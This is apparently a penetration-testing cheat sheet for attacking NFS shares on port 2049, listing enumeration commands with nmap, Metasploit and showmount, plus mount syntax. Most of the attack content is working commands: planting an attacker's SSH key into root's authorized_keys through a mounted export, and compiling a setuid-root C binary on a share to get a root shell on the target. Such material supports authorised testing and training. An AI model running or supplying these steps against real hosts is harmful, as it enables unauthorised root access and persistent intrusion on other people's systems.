# 2049 (NFS)

## Enumeration

### nmap Scripts

```bash
nmap -p 2049 --script=nfs* <IP>
nfs-ls  # List NFS exports and check permissions
nfs-showmount  # Like showmount -e
nfs-statfs  # Disk statistics and info from NFS share
```

### Metasploit

Scan NFS mounts and list permissions.

```bash
scanner/nfs/nfsmount
```

### Check Shares

Check Available Folders

```bash
showmount -e <IP>
cat /etc/exports  # List exported shares
```

## Mounting

### Create Mount

```bash
# Syntax
mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
# Example
mkdir /mnt/myroot
mount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/myroot -o nolock
# Unmount the mount
umount /mnt/myroot/
```

#### Using SSH

```bash
ssh-keygen  # Generate Key Pair
mkdir /mnt/myroot
mount -t nfs <IP>:/<DIR> /mnt/myroot
cat .ssh/id_rsa.pub >> /mnt/myroot/root/.ssh/authorized_keys
umount /mnt/myroot/
```

### Example Exploit

#### From Attacker as root user

```bash
mkdir <DIRECTORY>
mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
cd <DIRECTORY>
echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
gcc pwn.c -o pwn
chmod +s pwn
```

#### From Target as Victim

```bash
cd <SHARE>
./pwn # Root shell
```
